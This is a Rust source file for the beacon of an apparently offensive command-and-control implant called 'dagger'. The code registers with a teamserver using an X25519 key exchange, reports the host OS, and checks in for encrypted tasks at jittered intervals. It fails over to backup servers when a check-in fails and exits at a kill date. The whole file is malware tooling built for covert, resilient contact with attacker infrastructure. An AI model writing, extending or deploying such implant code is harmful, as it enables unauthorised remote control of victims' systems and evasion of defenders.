use crate::crypto::{self, EphemeralKeys, KEY_SIZE};
use crate::transport::{self, Transport, TransportResult};
use crate::ImplantConfig;
use rand::Rng;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{sleep, Duration};

/// The beacon manages the implant's lifecycle. It is event-driven:
/// there is no periodic beacon — the implant only communicates when
/// it has results to report or when a keepalive timer expires.
pub struct Beacon {
    config: ImplantConfig,
    transport: Box<dyn Transport>,
    session_key: Arc<Mutex<Option<[u8; KEY_SIZE]>>>,
    seq: Arc<Mutex<u64>>,
    keys: Arc<Mutex<EphemeralKeys>>,
}

impl Beacon {
    pub fn new(config: ImplantConfig) -> Result<Self, Box<dyn std::error::Error>> {
        let transport = transport::create_transport(&config.transport, &config.servers[0])?;
        Ok(Self {
            config,
            transport,
            session_key: Arc::new(Mutex::new(None)),
            seq: Arc::new(Mutex::new(0)),
            keys: Arc::new(Mutex::new(EphemeralKeys::generate())),
        })
    }

    /// Run the implant lifecycle. Blocks until kill_date or exit task.
    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.register().await?;

        loop {
            if self.config.kill_date > 0 {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                if now >= self.config.kill_date {
                    log::info!("kill date reached, exiting");
                    break;
                }
            }

            match self.transport.checkin().await {
                Ok(result) => {
                    if !result.data.is_empty() {
                        if let Err(e) = self.handle_task(&result.data).await {
                            log::error!("task handling failed: {e}");
                        }
                    }
                }
                Err(e) => {
                    log::warn!("checkin failed: {e}, rotating transport...");
                    self.rotate_transport().await?;
                }
            }

            if self.config.sleep_secs > 0 {
                let jitter_pct = self.config.jitter_pct as f64 / 100.0;
                let jitter = rand::thread_rng().gen_range(0.0..jitter_pct);
                let delay = (self.config.sleep_secs as f64 * (1.0 + jitter)) as u64;
                sleep(Duration::from_secs(delay)).await;
            } else {
                sleep(Duration::from_millis(100)).await;
            }
        }
        Ok(())
    }

    /// Key exchange: send our public key, receive server's public key, derive session key
    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let keys = self.keys.lock().await;
        let register_msg = serde_json::json!({
            "op": "register",
            "pubkey": hex::encode(keys.public.as_bytes()),
            "hostname": "implant",
            "os": std::env::consts::OS,
        });

        self.transport.send(register_msg.to_string().as_bytes()).await?;
        let result = self.transport.checkin().await?;
        let response: serde_json::Value =
            serde_json::from_slice(&result.data).unwrap_or_default();

        if let Some(server_pubkey_hex) = response.get("pubkey").and_then(|v| v.as_str()) {
            let server_pubkey_bytes = hex::decode(server_pubkey_hex)?;
            let mut server_pubkey_arr = [0u8; 32];
            server_pubkey_arr.copy_from_slice(&server_pubkey_bytes);
            let server_pub = x25519_dalek::PublicKey::from(server_pubkey_arr);

            let shared = crypto::compute_shared(&keys.secret, &server_pub);
            let session_id = response
                .get("session_id")
                .and_then(|v| v.as_str())
                .unwrap_or("0000000000000000")
                .as_bytes();
            let session_key = crypto::derive_session_key(&shared, session_id, b"dagger-session-v1");

            let mut sk = self.session_key.lock().await;
            *sk = Some(session_key);
            log::info!("session established");
        }

        Ok(())
    }

    /// Decrypt and dispatch a task from the teamserver
    async fn handle_task(&self, encrypted: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let sk = self.session_key.lock().await;
        let key = sk.ok_or("no session key")?;

        let plaintext = crypto::decrypt(&key, encrypted)?;
        drop(sk);

        if let Ok(task) = serde_json::from_slice::<serde_json::Value>(&plaintext) {
            log::info!("task received: {:?}", task.get("op"));
        }
        Ok(())
    }

    /// Rotate to next transport on failure
    async fn rotate_transport(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if self.config.servers.len() > 1 {
            let current = self.config.servers.remove(0);
            self.config.servers.push(current);
            let next_url = &self.config.servers[0];
            self.transport = transport::create_transport(&self.config.transport, next_url)?;
        }
        Ok(())
    }
}
